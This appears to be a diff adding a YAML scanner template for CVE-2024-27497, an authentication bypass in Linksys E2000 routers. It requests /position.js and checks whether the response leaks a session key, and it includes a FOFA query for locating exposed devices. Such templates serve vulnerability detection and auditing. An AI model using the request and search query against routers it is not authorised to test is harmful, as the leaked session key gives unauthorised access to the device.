@@ -1,0 +1,21 @@
+id: poc-yaml-Linksys-e2000-position-js-authentication-bypass
+info:
+  name: Linksys E2000 position.js 身份验证绕过漏洞(CVE-2024-27497)
+  severity: high
+  tags:
+  - CVE-2024-27497
+  - 失效的身份认证
+  finger: Linksys E2000
+  fofa: app="LINKSYS-E2000"
+requests:
+- method: GET
+  path: /position.js
+  expression: 'status_code == 200 &&
+
+    matches(body,`session_key = "[0-9a-zA-Z]+"`) &&
+
+    contains(body,"close_session")
+
+    '
+variables: {}
+transport: http
